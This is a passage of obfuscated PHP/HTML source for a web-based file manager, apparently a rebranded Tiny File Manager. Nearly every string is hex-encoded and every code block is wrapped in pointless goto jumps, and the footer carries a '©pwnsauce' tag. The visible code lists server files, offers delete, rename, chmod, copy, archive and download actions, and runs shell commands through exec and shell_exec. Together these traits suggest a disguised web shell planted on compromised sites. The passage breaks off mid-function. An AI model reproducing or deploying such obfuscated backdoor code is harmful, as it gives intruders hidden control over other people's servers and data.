                            <a title="<?php goto opet_1ccb5; opet_1ccb5: echo lng("\x44\145\x6C\145\x74\145") ?>" href="?p=<?php goto opet_1ccb7; opet_1ccb7: echo urlencode(FM_PATH) ?>&amp;del=<?php goto opet_1ccb8; opet_1ccb8: echo urlencode($f) ?>" onclick="confirmDailog(event, '1028','<?php goto opet_1ccbd; opet_1ccbd: echo lng("\x44\145\x6C\145\x74\145")."\x20".lng("\x46\157\x6C\144\x65\162"); ?>','<?php goto opet_1ccbe; opet_1ccbe: echo urlencode($f) ?>', this.href);"> <i class="fa fa-trash-o" aria-hidden="true"></i></a>
                            <a title="<?php goto opet_1ccc1; opet_1ccc1: echo lng("\x52\145\x6E\141\x6D\145") ?>" href="#" onclick="rename('<?php goto opet_1ccc2; opet_1ccc2: echo fm_enc(addslashes(FM_PATH)) ?>', '<?php goto opet_1ccc3; opet_1ccc3: echo fm_enc(addslashes($f)) ?>');return false;"><i class="fa fa-pencil-square-o" aria-hidden="true"></i></a>
                            <a title="<?php goto opet_1ccc6; opet_1ccc6: echo lng("\x43\157\x70\171\x54\157") ?>..." href="?p=&amp;copy=<?php goto opet_1ccc9; opet_1ccc9: echo urlencode(trim(FM_PATH . "\x2F" . $f, "\x2F")) ?>"><i class="fa fa-files-o" aria-hidden="true"></i></a>
                        <?php goto opet_1ccca; opet_1ccca: endif; ?>
                        <a title="<?php goto opet_1ccce; opet_1ccce: echo lng("\x44\151\x72\145\x63\164\x4C\151\x6E\153") ?>" href="<?php goto opet_1ccd1; opet_1ccd1: echo fm_enc(FM_ROOT_URL . (FM_PATH != "" ? "\x2F" . FM_PATH : "") . "\x2F" . $f . "\x2F") ?>" target="_blank"><i class="fa fa-link" aria-hidden="true"></i></a>
                    </td>
                </tr>
                <?php goto opet_1ccfc; opet_1ccfc: flush();
                $ii++;
            }
            $ik = 6070;
            foreach ($files as $f) {
                $is_link = is_link($path . "\x2F" . $f);
                $img = $is_link ? "\x66\141\x20\146\x61\055\x66\151\x6C\145\x2D\164\x65\170\x74\055\x6F" : fm_get_file_icon_class($path . "\x2F" . $f);
                $modif_raw = filemtime($path . "\x2F" . $f);
                $modif = date(FM_DATETIME_FORMAT, $modif_raw);
                $date_sorting = strtotime(date("\x46\040\x64\040\x59\040\x48\072\x69\072\x73\056", $modif_raw));
                $filesize_raw = fm_get_size($path . "\x2F" . $f);
                $filesize = fm_get_filesize($filesize_raw);
                $filelink = "\x3F\160\x3D" . urlencode(FM_PATH) . "\x26\141\x6D\160\x3B\166\x69\145\x77\075" . urlencode($f);
                $all_files_size += $filesize_raw;
                $perms = substr(decoct(fileperms($path . "\x2F" . $f)), -4);
                if (function_exists("\x70\157\x73\151\x78\137\x67\145\x74\160\x77\165\x69\144") && function_exists("\x70\157\x73\151\x78\137\x67\145\x74\147\x72\147\x69\144")) {
                    $owner = posix_getpwuid(fileowner($path . "\x2F" . $f));
                    $group = posix_getgrgid(filegroup($path . "\x2F" . $f));
                    if ($owner === false) {
                        $owner = array("\x6E\141\x6D\145" => "\x3F");
                    }
                    if ($group === false) {
                        $group = array("\x6E\141\x6D\145" => "\x3F");
                    }
                } else {
                    $owner = array("\x6E\141\x6D\145" => "\x3F");
                    $group = array("\x6E\141\x6D\145" => "\x3F");
                } ?>
                <tr>
                    <?php goto opet_1ccfd; opet_1ccfd: if (!FM_READONLY): ?>
                        <td class="custom-checkbox-td">
                        <div class="custom-control custom-checkbox">
                            <input type="checkbox" class="custom-control-input" id="<?php goto opet_1ccff; opet_1ccff: echo $ik ?>" name="file[]" value="<?php goto opet_1cd00; opet_1cd00: echo fm_enc($f) ?>">
                            <label class="custom-control-label" for="<?php goto opet_1cd01; opet_1cd01: echo $ik ?>"></label>
                        </div>
                        </td><?php goto opet_1cd02; opet_1cd02: endif; ?>
                    <td data-sort=<?php goto opet_1cd03; opet_1cd03: echo fm_enc($f) ?>>
                        <div class="filename">
                        <?php goto opet_1cd0d; opet_1cd0d: if (in_array(strtolower(pathinfo($f, PATHINFO_EXTENSION)), array("\x67\151\x66", "\x6A\160\x67", "\x6A\160\x65\147", "\x70\156\x67", "\x62\155\x70", "\x69\143\x6F", "\x73\166\x67", "\x77\145\x62\160", "\x61\166\x69\146"))): ?>
                                <?php goto opet_1cd10; opet_1cd10: $imagePreview = fm_enc(FM_ROOT_URL . (FM_PATH != "" ? "\x2F" . FM_PATH : "") . "\x2F" . $f); ?>
                                <a href="<?php goto opet_1cd11; opet_1cd11: echo $filelink ?>" data-preview-image="<?php goto opet_1cd12; opet_1cd12: echo $imagePreview ?>" title="<?php goto opet_1cd13; opet_1cd13: echo fm_enc($f) ?>">
                           <?php goto opet_1cd15; opet_1cd15: else: ?>
                                <a href="<?php goto opet_1cd16; opet_1cd16: echo $filelink ?>" title="<?php goto opet_1cd17; opet_1cd17: echo $f ?>">
                            <?php goto opet_1cd18; opet_1cd18: endif; ?>
                                    <i class="<?php goto opet_1cd19; opet_1cd19: echo $img ?>"></i> <?php goto opet_1cd1a; opet_1cd1a: echo fm_convert_win(fm_enc($f)) ?>
                                </a>
                                <?php goto opet_1cd20; opet_1cd20: echo($is_link ? "\x20\046\x72\141\x72\162\x3B\040\x3C\151\x3E" . readlink($path . "\x2F" . $f) . "\x3C\057\x69\076" : "") ?>
                        </div>
                    </td>
                    <td data-order="b-<?php goto opet_1cd22; opet_1cd22: echo str_pad($filesize_raw, 18, "\x30", STR_PAD_LEFT); ?>"><span title="<?php goto opet_1cd25; opet_1cd25: printf("\x25\163\x20\142\x79\164\x65\163", $filesize_raw) ?>">
                        <?php goto opet_1cd26; opet_1cd26: echo $filesize; ?>
                        </span></td>
                    <td data-order="b-<?php goto opet_1cd28; opet_1cd28: echo $date_sorting; ?>"><?php goto opet_1cd29; opet_1cd29: echo $modif ?></td>
                    <?php goto opet_1cd2a; opet_1cd2a: if (!FM_IS_WIN && !$hide_Cols): ?>
                        <td><?php goto opet_1cd2b; opet_1cd2b: if (!FM_READONLY): ?><a title="<?php goto opet_1cd30; opet_1cd30: echo "\x43\150\x61\156\x67\145\x20\120\x65\162\x6D\151\x73\163\x69\157\x6E\163" ?>" href="?p=<?php goto opet_1cd31; opet_1cd31: echo urlencode(FM_PATH) ?>&amp;chmod=<?php goto opet_1cd32; opet_1cd32: echo urlencode($f) ?>"><?php goto opet_1cd33; opet_1cd33: echo $perms ?></a><?php goto opet_1cd34; opet_1cd34: else: ?><?php goto opet_1cd35; opet_1cd35: echo $perms ?><?php goto opet_1cd36; opet_1cd36: endif; ?>
                        </td>
                        <td><?php goto opet_1cd3a; opet_1cd3a: echo fm_enc($owner["\x6E\141\x6D\145"] . "\x3A" . $group["\x6E\141\x6D\145"]) ?></td>
                    <?php goto opet_1cd3c; opet_1cd3c: endif; ?>
                    <td class="inline-actions">
                        <?php goto opet_1cd3d; opet_1cd3d: if (!FM_READONLY): ?>
                            <a title="<?php goto opet_1cd3f; opet_1cd3f: echo lng("\x44\145\x6C\145\x74\145") ?>" href="?p=<?php goto opet_1cd41; opet_1cd41: echo urlencode(FM_PATH) ?>&amp;del=<?php goto opet_1cd42; opet_1cd42: echo urlencode($f) ?>" onclick="confirmDailog(event, 1209, '<?php goto opet_1cd46; opet_1cd46: echo lng("\x44\145\x6C\145\x74\145")."\x20".lng("\x46\151\x6C\145"); ?>','<?php goto opet_1cd47; opet_1cd47: echo urlencode($f); ?>', this.href);"> <i class="fa fa-trash-o"></i></a>
                            <a title="<?php goto opet_1cd4a; opet_1cd4a: echo lng("\x52\145\x6E\141\x6D\145") ?>" href="#" onclick="rename('<?php goto opet_1cd4b; opet_1cd4b: echo fm_enc(addslashes(FM_PATH)) ?>', '<?php goto opet_1cd4c; opet_1cd4c: echo fm_enc(addslashes($f)) ?>');return false;"><i class="fa fa-pencil-square-o"></i></a>
                            <a title="<?php goto opet_1cd4f; opet_1cd4f: echo lng("\x43\157\x70\171\x54\157") ?>..."
                               href="?p=<?php goto opet_1cd50; opet_1cd50: echo urlencode(FM_PATH) ?>&amp;copy=<?php goto opet_1cd53; opet_1cd53: echo urlencode(trim(FM_PATH . "\x2F" . $f, "\x2F")) ?>"><i class="fa fa-files-o"></i></a>
                        <?php goto opet_1cd54; opet_1cd54: endif; ?>
                        <a title="<?php goto opet_1cd58; opet_1cd58: echo lng("\x44\151\x72\145\x63\164\x4C\151\x6E\153") ?>" href="<?php goto opet_1cd5b; opet_1cd5b: echo fm_enc(FM_ROOT_URL . (FM_PATH != "" ? "\x2F" . FM_PATH : "") . "\x2F" . $f) ?>" target="_blank"><i class="fa fa-link"></i></a>
                        <a title="<?php goto opet_1cd5e; opet_1cd5e: echo lng("\x44\157\x77\156\x6C\157\x61\144") ?>" href="?p=<?php goto opet_1cd5f; opet_1cd5f: echo urlencode(FM_PATH) ?>&amp;dl=<?php goto opet_1cd60; opet_1cd60: echo urlencode($f) ?>" onclick="confirmDailog(event, 1211, '<?php goto opet_1cd63; opet_1cd63: echo lng("\x44\157\x77\156\x6C\157\x61\144"); ?>','<?php goto opet_1cd64; opet_1cd64: echo urlencode($f); ?>', this.href);"><i class="fa fa-download"></i></a>
                    </td>
                </tr>
                <?php goto opet_1cd66; opet_1cd66: flush();
                $ik++;
            }

            if (empty($folders) && empty($files)) { ?>
                <tfoot>
                    <tr><?php goto opet_1cd67; opet_1cd67: if (!FM_READONLY): ?>
                            <td></td><?php goto opet_1cd68; opet_1cd68: endif; ?>
                        <td colspan="<?php goto opet_1cd6a; opet_1cd6a: echo (!FM_IS_WIN && !$hide_Cols) ? "\x36" : "\x34" ?>"><em><?php goto opet_1cd6f; opet_1cd6f: echo lng("\x46\157\x6C\144\x65\162\x20\151\x73\040\x65\155\x70\164\x79") ?></em></td>
                    </tr>
                </tfoot>
                <?php goto opet_1cd70; opet_1cd70: } else { ?>
                <tfoot>
                    <tr>
                        <td class="gray" colspan="<?php goto opet_1cd73; opet_1cd73: echo (!FM_IS_WIN && !$hide_Cols) ? (FM_READONLY ? "\x36" :"\x37") : (FM_READONLY ? "\x34" : "\x35") ?>">
                            <?php goto opet_1cd82; opet_1cd82: echo lng("\x46\165\x6C\154\x53\151\x7A\145")."\x3A\040\x3C\163\x70\141\x6E\040\x63\154\x61\163\x73\075\x22\142\x61\144\x67\145\x20\164\x65\170\x74\055\x62\147\x2D\154\x69\147\x68\164\x20\142\x6F\162\x64\145\x72\055\x72\141\x64\151\x75\163\x2D\060\x22\076".fm_get_filesize($all_files_size)."\x3C\057\x73\160\x61\156\x3E" ?>
                            <?php goto opet_1cd90; opet_1cd90: echo lng("\x46\151\x6C\145")."\x3A\040\x3C\163\x70\141\x6E\040\x63\154\x61\163\x73\075\x22\142\x61\144\x67\145\x20\164\x65\170\x74\055\x62\147\x2D\154\x69\147\x68\164\x20\142\x6F\162\x64\145\x72\055\x72\141\x64\151\x75\163\x2D\060\x22\076".$num_files."\x3C\057\x73\160\x61\156\x3E" ?>
                            <?php goto opet_1cd9e; opet_1cd9e: echo lng("\x46\157\x6C\144\x65\162")."\x3A\040\x3C\163\x70\141\x6E\040\x63\154\x61\163\x73\075\x22\142\x61\144\x67\145\x20\164\x65\170\x74\055\x62\147\x2D\154\x69\147\x68\164\x20\142\x6F\162\x64\145\x72\055\x72\141\x64\151\x75\163\x2D\060\x22\076".$num_folders."\x3C\057\x73\160\x61\156\x3E" ?>
                        </td>
                    </tr>
                </tfoot>
                <?php goto opet_1cd9f; opet_1cd9f: } ?>
        </table>
    </div>

    <div class="row">
        <?php goto opet_1cda0; opet_1cda0: if (!FM_READONLY): ?>
        <div class="col-xs-12 col-sm-9">
            <ul class="list-inline footer-action">
                <li class="list-inline-item"> <a href="#/select-all" class="btn btn-small btn-outline-primary btn-2" onclick="select_all();return false;"><i class="fa fa-check-square"></i> <?php goto opet_1cda4; opet_1cda4: echo lng("\x53\145\x6C\145\x63\164\x41\154\x6C") ?> </a></li>
                <li class="list-inline-item"><a href="#/unselect-all" class="btn btn-small btn-outline-primary btn-2" onclick="unselect_all();return false;"><i class="fa fa-window-close"></i> <?php goto opet_1cda8; opet_1cda8: echo lng("\x55\156\x53\145\x6C\145\x63\164\x41\154\x6C") ?> </a></li>
                <li class="list-inline-item"><a href="#/invert-all" class="btn btn-small btn-outline-primary btn-2" onclick="invert_all();return false;"><i class="fa fa-th-list"></i> <?php goto opet_1cdac; opet_1cdac: echo lng("\x49\156\x76\145\x72\164\x53\145\x6C\145\x63\164\x69\157\x6E") ?> </a></li>
                <li class="list-inline-item"><input type="submit" class="hidden" name="delete" id="a-delete" value="Delete" onclick="return confirm('<?php goto opet_1cdb4; opet_1cdb4: echo lng("\x44\145\x6C\145\x74\145\x20\163\x65\154\x65\143\x74\145\x64\040\x66\151\x6C\145\x73\040\x61\156\x64\040\x66\157\x6C\144\x65\162\x73\077"); ?>')">
                    <a href="javascript:document.getElementById('a-delete').click();" class="btn btn-small btn-outline-primary btn-2"><i class="fa fa-trash"></i> <?php goto opet_1cdb7; opet_1cdb7: echo lng("\x44\145\x6C\145\x74\145") ?> </a></li>
                <li class="list-inline-item"><input type="submit" class="hidden" name="zip" id="a-zip" value="zip" onclick="return confirm('<?php goto opet_1cdbb; opet_1cdbb: echo lng("\x43\162\x65\141\x74\145\x20\141\x72\143\x68\151\x76\145\x3F"); ?>')">
                    <a href="javascript:document.getElementById('a-zip').click();" class="btn btn-small btn-outline-primary btn-2"><i class="fa fa-file-archive-o"></i> <?php goto opet_1cdbe; opet_1cdbe: echo lng("\x5A\151\x70") ?> </a></li>
                <li class="list-inline-item"><input type="submit" class="hidden" name="tar" id="a-tar" value="tar" onclick="return confirm('<?php goto opet_1cdc2; opet_1cdc2: echo lng("\x43\162\x65\141\x74\145\x20\141\x72\143\x68\151\x76\145\x3F"); ?>')">
                    <a href="javascript:document.getElementById('a-tar').click();" class="btn btn-small btn-outline-primary btn-2"><i class="fa fa-file-archive-o"></i> <?php goto opet_1cdc4; opet_1cdc4: echo lng("\x54\141\x72") ?> </a></li>
                <li class="list-inline-item"><input type="submit" class="hidden" name="copy" id="a-copy" value="Copy">
                    <a href="javascript:document.getElementById('a-copy').click();" class="btn btn-small btn-outline-primary btn-2"><i class="fa fa-files-o"></i> <?php goto opet_1cdc7; opet_1cdc7: echo lng("\x43\157\x70\171") ?> </a></li>
            </ul>
        </div>
        <div class="col-3 d-none d-sm-block"><a class="float-right text-muted">&copy;pwnsauce</a></div>
        <?PHp else: ?>
        <div class="col-3 d-none d-sm-block"><a class="float-right text-muted">&copy;pwnsauce</a></div>
        <?PHp endif; ?>
    </div>
</form>

<?php goto opet_1d17f; opet_1d17f: fm_show_footer();
function print_external($key) {
    global $external;

    if(!array_key_exists($key, $external)) {
        echo "\x3C\041\x2D\055\x20\105\x58\124\x45\122\x4E\101\x4C\072\x20\115\x49\123\x53\111\x4E\107\x20\113\x45\131\x20\044\x6B\145\x79\040\x2D\055\x3E";
        return;
    }

    echo "\x24\145\x78\164\x65\162\x6E\141\x6C\133\x24\153\x65\171\x5D";
}

function verifyToken($token) 
{
    if (hash_equals($_SESSION["\x74\157\x6B\145\x6E"], $token)) { 
        return true;
    }
    return false;
}

function fm_rdelete($path)
{
    if (is_link($path)) {
        return unlink($path);
    } elseif (is_dir($path)) {
        $objects = scandir($path);
        $ok = true;
        if (is_array($objects)) {
            foreach ($objects as $file) {
                if ($file != "\x2E" && $file != "\x2E\056") {
                    if (!fm_rdelete($path . "\x2F" . $file)) {
                        $ok = false;
                    }
                }
            }
        }
        return ($ok) ? rmdir($path) : false;
    } elseif (is_file($path)) {
        return unlink($path);
    }
    return false;
}

function fm_rchmod($path, $filemode, $dirmode)
{
    if (is_dir($path)) {
        if (!chmod($path, $dirmode)) {
            return false;
        }
        $objects = scandir($path);
        if (is_array($objects)) {
            foreach ($objects as $file) {
                if ($file != "\x2E" && $file != "\x2E\056") {
                    if (!fm_rchmod($path . "\x2F" . $file, $filemode, $dirmode)) {
                        return false;
                    }
                }
            }
        }
        return true;
    } elseif (is_link($path)) {
        return true;
    } elseif (is_file($path)) {
        return chmod($path, $filemode);
    }
    return false;
}

function fm_is_valid_ext($filename)
{
    $allowed = (FM_FILE_EXTENSION) ? explode("\x2C", FM_FILE_EXTENSION) : false;

    $ext = pathinfo($filename, PATHINFO_EXTENSION);
    $isFileAllowed = ($allowed) ? in_array($ext, $allowed) : true;

    return ($isFileAllowed) ? true : false;
}

function fm_rename($old, $new)
{
    $isFileAllowed = fm_is_valid_ext($new);

    if(!is_dir($old)) {
        if (!$isFileAllowed) return false;
    }

    return (!file_exists($new) && file_exists($old)) ? rename($old, $new) : null;
}

function fm_rcopy($path, $dest, $upd = true, $force = true)
{
    if (is_dir($path)) {
        if (!fm_mkdir($dest, $force)) {
            return false;
        }
        $objects = scandir($path);
        $ok = true;
        if (is_array($objects)) {
            foreach ($objects as $file) {
                if ($file != "\x2E" && $file != "\x2E\056") {
                    if (!fm_rcopy($path . "\x2F" . $file, $dest . "\x2F" . $file)) {
                        $ok = false;
                    }
                }
            }
        }
        return $ok;
    } elseif (is_file($path)) {
        return fm_copy($path, $dest, $upd);
    }
    return false;
}

function fm_mkdir($dir, $force)
{
    if (file_exists($dir)) {
        if (is_dir($dir)) {
            return $dir;
        } elseif (!$force) {
            return false;
        }
        unlink($dir);
    }
    return mkdir($dir, 0777, true);
}

function fm_copy($f1, $f2, $upd)
{
    $time1 = filemtime($f1);
    if (file_exists($f2)) {
        $time2 = filemtime($f2);
        if ($time2 >= $time1 && $upd) {
            return false;
        }
    }
    $ok = copy($f1, $f2);
    if ($ok) {
        touch($f2, $time1);
    }
    return $ok;
}

function fm_get_mime_type($file_path)
{
    if (function_exists("\x66\151\x6E\146\x6F\137\x6F\160\x65\156")) {
        $finfo = finfo_open(FILEINFO_MIME_TYPE);
        $mime = finfo_file($finfo, $file_path);
        finfo_close($finfo);
        return $mime;
    } elseif (function_exists("\x6D\151\x6D\145\x5F\143\x6F\156\x74\145\x6E\164\x5F\164\x79\160\x65")) {
        return mime_content_type($file_path);
    } elseif (!stristr(ini_get("\x64\151\x73\141\x62\154\x65\137\x66\165\x6E\143\x74\151\x6F\156\x73"), "\x73\150\x65\154\x6C\137\x65\170\x65\143")) {
        $file = escapeshellarg($file_path);
        $mime = shell_exec("\x66\151\x6C\145\x20\055\x62\151\x20" . $file);
        return $mime;
    } else {
        return "\x2D\055";
    }
}

function fm_redirect($url, $code = 302)
{
    header("\x4C\157\x63\141\x74\151\x6F\156\x3A\040" . $url, true, $code);
    exit;
}

function get_absolute_path($path) {
    $path = str_replace(array("\x2F", "\x5C\134"), DIRECTORY_SEPARATOR, $path);
    $parts = array_filter(explode(DIRECTORY_SEPARATOR, $path), "\x73\164\x72\154\x65\156");
    $absolutes = array();
    foreach ($parts as $part) {
        if ("\x2E" == $part) continue;
        if ("\x2E\056" == $part) {
            array_pop($absolutes);
        } else {
            $absolutes[] = $part;
        }
    }
    return implode(DIRECTORY_SEPARATOR, $absolutes);
}

function fm_clean_path($path, $trim = true)
{
    $path = $trim ? trim($path) : $path;
    $path = trim($path, "\x5C\134\x2F");
    $path = str_replace(array("\x2E\056\x2F", "\x2E\056\x5C\134"), "", $path);
    $path =  get_absolute_path($path);
    if ($path == "\x2E\056") {
        $path = "";
    }
    return str_replace("\x5C\134", "\x2F", $path);
}

function fm_get_parent_path($path)
{
    $path = fm_clean_path($path);
    if ($path != "") {
        $array = explode("\x2F", $path);
        if (count($array) > 1) {
            $array = array_slice($array, 0, -1);
            return implode("\x2F", $array);
        }
        return "";
    }
    return false;
}

function fm_get_display_path($file_path)
{
    global $path_display_mode, $root_path, $root_url;
    switch ($path_display_mode) {
        case "\x72\145\x6C\141\x74\151\x76\145":
            return array(
                "\x6C\141\x62\145\x6C" => "\x50\141\x74\150",
                "\x70\141\x74\150" => fm_enc(fm_convert_win(str_replace($root_path, "", $file_path)))
            );
        case "\x68\157\x73\164":
            $relative_path = str_replace($root_path, "", $file_path);
            return array(
                "\x6C\141\x62\145\x6C" => "\x48\157\x73\164\x20\120\x61\164\x68",
                "\x70\141\x74\150" => fm_enc(fm_convert_win("\x2F" . $root_url . "\x2F" . ltrim(str_replace("\x5C\134", "\x2F", $relative_path), "\x2F")))
            );
        case "\x66\165\x6C\154":
        default:
            return array(
                "\x6C\141\x62\145\x6C" => "\x46\165\x6C\154\x20\120\x61\164\x68",
                "\x70\141\x74\150" => fm_enc(fm_convert_win($file_path))
            );
    }
}

function fm_is_exclude_items($file) {
    $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
    if (isset($exclude_items) and sizeof($exclude_items)) {
        unset($exclude_items);
    }

    $exclude_items = FM_EXCLUDE_ITEMS;
    if (version_compare(PHP_VERSION, "\x37\056\x30\056\x30", "\x3C")) {
        $exclude_items = unserialize($exclude_items);
    }
    if (!in_array($file, $exclude_items) && !in_array("\x2A\056\x24\145\x78\164", $exclude_items)) {
        return true;
    }
    return false;
}

function fm_get_translations($tr) {
    try {
        $content = @file_get_contents("\x74\162\x61\156\x73\154\x61\164\x69\157\x6E\056\x6A\163\x6F\156");
        if($content !== FALSE) {
            $lng = json_decode($content, TRUE);
            global $lang_list;
            foreach ($lng["\x6C\141\x6E\147\x75\141\x67\145"] as $key => $value)
            {
                $code = $value["\x63\157\x64\145"];
                $lang_list[$code] = $value["\x6E\141\x6D\145"];
                if ($tr)
                    $tr[$code] = $value["\x74\162\x61\156\x73\154\x61\164\x69\157\x6E"];
            }
            return $tr;
        }

    }
    catch (Exception $e) {
        echo $e;
    }
}

function fm_get_size($file)
{
    static $iswin;
    static $isdarwin;
    if (!isset($iswin)) {
        $iswin = (strtoupper(substr(PHP_OS, 0, 3)) == "\x57\111\x4E");
    }
    if (!isset($isdarwin)) {
        $isdarwin = (strtoupper(substr(PHP_OS, 0)) == "\x44\101\x52\127\x49\116");
    }

    static $exec_works;
    if (!isset($exec_works)) {
        $exec_works = (function_exists("\x65\170\x65\143") && !ini_get("\x73\141\x66\145\x5F\155\x6F\144\x65") && @exec("\x65\143\x68\157\x20\105\x58\105\x43") == "\x45\130\x45\103");
    }

    if ($exec_works) {
        $arg = escapeshellarg($file);
        $cmd = ($iswin) ? "\x66\157\x72\040\x25\106\x20\151\x6E\040\x28\134"$file\"\x29\040\x64\157\x20\100\x65\143\x68\157\x20\045\x7E\172\x46" : ($isdarwin ? "\x73\164\x61\164\x20\055\x66\045\x7A\040\x24\141\x72\147" : "\x73\164\x61\164\x20\055\x63\045\x73\040\x24\141\x72\147");
        @exec($cmd, $output);
        if (is_array($output) && ctype_digit($size = trim(implode("\x5C\156", $output)))) {
            return $size;
        }
    }
    if ($iswin && class_exists("\x43\117\x4D")) {
        try {
            $fsobj = new COM("\x53\143\x72\151\x70\164\x69\156\x67\056\x46\151\x6C\145\x53\171\x73\164\x65\155\x4F\142\x6A\145\x63\164");
            $f = $fsobj->GetFile( realpath($file) );
            $size = $f->Size;
        } catch (Exception $e) {
            $size = null;
        }
        if (ctype_digit($size)) {
            return $size;
        }
    }

    return filesize($file);
}

function fm_get_filesize($size)
{
    $size = (float) $size;
    $units = array("\x42", "\x4B\102", "\x4D\102", "\x47\102", "\x54\102", "\x50\102", "\x45\102", "\x5A\102", "\x59\102");
    $power = ($size > 0) ? floor(log($size, 1024)) : 0;
    $power = ($power > (count($units) - 1)) ? (count($units) - 1) : $power;
    return sprintf("\x25\163\x20\045\x73", round($size / pow(1024, $power), 2), $units[$power]);
}

function fm_get_directorysize($directory) {
    $bytes = 0;
    $directory = realpath($directory);
    if ($directory !== false && $directory != "" && file_exists($directory)){
        foreach(new RecursiveIteratorIterator(new RecursiveDirectoryIterator($directory, FilesystemIterator::SKIP_DOTS)) as $file){
            $bytes += $file->getSize();
        }
    }
    return $bytes;
}

function fm_get_zif_info($path, $ext) {
    if ($ext == "\x7A\151\x70" && function_exists("\x7A\151\x70\137\x6F\160\x65\156")) {
        $arch = @zip_open($path);
        if ($arch) {
            $filenames = array();
            while ($zip_entry = @zip_read($arch)) {
                $zip_name = @zip_entry_name($zip_entry);
                $zip_folder = substr($zip_name, -1) == "\x2F";
                $filenames[] = array(
                    "\x6E\141\x6D\145" => $zip_name,
                    "\x66\151\x6C\145\x73\151\x7A\145" => @zip_entry_filesize($zip_entry),
                    "\x63\157\x6D\160\x72\145\x73\163\x65\144\x5F\163\x69\172\x65" => @zip_entry_compressedsize($zip_entry),
                    "\x66\157\x6C\144\x65\162" => $zip_folder
                    //"\x63\157\x6D\160\x72\145\x73\163\x69\157\x6E\137\x6D\145\x74\150\x6F\144" => zip_entry_compressionmethod($zip_entry),
                );
            }
            @zip_close($arch);
            return $filenames;
        }
    } elseif($ext == "\x74\141\x72" && class_exists("\x50\150\x61\162\x44\141\x74\141")) {
        $archive = new PharData($path);
        $filenames = array();
        foreach(new RecursiveIteratorIterator($archive) as $file) {
            $parent_info = $file->getPathInfo();
            $zip_name = str_replace("\x70\150\x61\162\x3A\057\x2F".$path, "", $file->getPathName());
            $zip_name = substr($zip_name, ($pos = strpos($zip_name, "\x2F")) !== false ? $pos + 1 : 0);
            $zip_folder = $parent_info->getFileName();
            $zip_info = new SplFileInfo($file);
            $filenames[] = array(
                "\x6E\141\x6D\145" => $zip_name,
                "\x66\151\x6C\145\x73\151\x7A\145" => $zip_info->getSize(),
                "\x63\157\x6D\160\x72\145\x73\163\x65\144\x5F\163\x69\172\x65" => $file->getCompressedSize(),
                "\x66\157\x6C\144\x65\162" => $zip_folder
            );
        }
        return $filenames;
    }
    return false;
}

function fm_enc($text)
{
    return htmlspecialchars($text, ENT_QUOTES, "\x55\124\x46\055\x38");
}

function fm_isvalid_filename($text) {
    return (strpbrk($text, "\x2F\077\x25\052\x3A\174\x22\074\x3E") === FALSE) ? true : false;
}

function fm_set_msg($msg, $status = "\x6F\153")
{
    $_SESSION[FM_SESSION_ID]["\x6D\145\x73\163\x61\147\x65"] = $msg;
    $_SESSION[FM_SESSION_ID]["\x73\164\x61\164\x75\163"] = $status;
}

function fm_is_utf8($string)
{
    return preg_match("\x2F\057\x75", $string);
}

function fm_convert_win($filename)
{
    if (FM_IS_WIN && function_exists("\x69\143\x6F\156\x76")) {
        $filename = iconv(FM_ICONV_INPUT_ENC, "\x55\124\x46\055\x38\057\x2F\111\x47\116\x4F\122\x45", $filename);
    }
    return $filename;
}

function fm_object_to_array($obj)
{
    if (!is_object($obj) && !is_array($obj)) {
        return $obj;
    }
    if (is_object($obj)) {
        $obj = get_object_vars($obj);
    }
    return array_map("\x66\155\x5F\157\x62\152\x65\143\x74\137\x74\157\x5F\141\x72\162\x61\171", $obj);
}

function fm_get_file_icon_class($path)
{
    $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));

    switch ($ext) {
        case "\x69\143\x6F":
        case "\x67\151\x66":
        case "\x6A\160\x67":
        case "\x6A\160\x65\147":
        case "\x6A\160\x63":
        case "\x6A\160\x32":
        case "\x6A\160\x78":
        case "\x78\142\x6D":
        case "\x77\142\x6D\160":
        case "\x70\156\x67":
        case "\x62\155\x70":
        case "\x74\151\x66":
        case "\x74\151\x66\146":
        case "\x77\145\x62\160":
        case "\x61\166\x69\146":
        case "\x73\166\x67":
            $img = "\x66\141\x20\146\x61\055\x70\151\x63\164\x75\162\x65\055\x6F";
            break;
        case "\x70\141\x73\163\x77\144":
        case "\x66\164\x70\161\x75\157\x74\141":
        case "\x73\161\x6C":
        case "\x6A\163":
        case "\x74\163":
        case "\x6A\163\x78":
        case "\x74\163\x78":
        case "\x68\142\x73":
        case "\x6A\163\x6F\156":
        case "\x73\150":
        case "\x63\157\x6E\146\x69\147":
        case "\x74\167\x69\147":
        case "\x74\160\x6C":
        case "\x6D\144":
        case "\x67\151\x74\151\x67\156\x6F\162\x65":
        case "\x63":
        case "\x63\160\x70":
        case "\x63\163":
        case "\x70\171":
        case "\x72\163":
        case "\x6D\141\x70":
        case "\x6C\157\x63\153":
        case "\x64\164\x64":
            $img = "\x66\141\x20\146\x61\055\x66\151\x6C\145\x2D\143\x6F\144\x65\055\x6F";
            break;
        case "\x74\170\x74":
        case "\x69\156\x69":
        case "\x63\157\x6E\146":
        case "\x6C\157\x67":
        case "\x68\164\x61\143\x63\145\x73\163":
        case "\x79\141\x6D\154":
        case "\x79\155\x6C":
        case "\x74\157\x6D\154":
        case "\x74\155\x70":
        case "\x74\157\x70":
        case "\x62\157\x74":
        case "\x64\141\x74":
        case "\x62\141\x6B":
        case "\x68\164\x70\141\x73\163\x77\144":
        case "\x70\154":
            $img = "\x66\141\x20\146\x61\055\x66\151\x6C\145\x2D\164\x65\170\x74\055\x6F";
            break;
        case "\x63\163\x73":
        case "\x6C\145\x73\163":
        case "\x73\141\x73\163":
        case "\x73\143\x73\163":
            $img = "\x66\141\x20\146\x61\055\x63\163\x73\063";
            break;
        case "\x62\172\x32":
        case "\x7A\151\x70":
        case "\x72\141\x72":
        case "\x67\172":
        case "\x74\141\x72":
        case "\x37\172":
        case "\x78\172":
            $img = "\x66\141\x20\146\x61\055\x66\151\x6C\145\x2D\141\x72\143\x68\151\x76\145\x2D\157";
            break;
        case "\x70\150\x70":
        case "\x70\150\x70\064":
        case "\x70\150\x70\065":
        case "\x70\150\x70\163":
        case "\x70\150\x74\155\x6C":
            $img = "\x66\141\x20\146\x61\055\x63\157\x64\145";
            break;
        case "\x68\164\x6D":
        case "\x68\164\x6D\154":
        case "\x73\150\x74\155\x6C":
        case "\x78\150\x74\155\x6C":
            $img = "\x66\141\x20\146\x61\055\x68\164\x6D\154\x35";
            break;
        case "\x78\155\x6C":
        case "\x78\163\x6C":
            $img = "\x66\141\x20\146\x61\055\x66\151\x6C\145\x2D\145\x78\143\x65\154\x2D\157";
            break;
        case "\x77\141\x76":
        case "\x6D\160\x33":
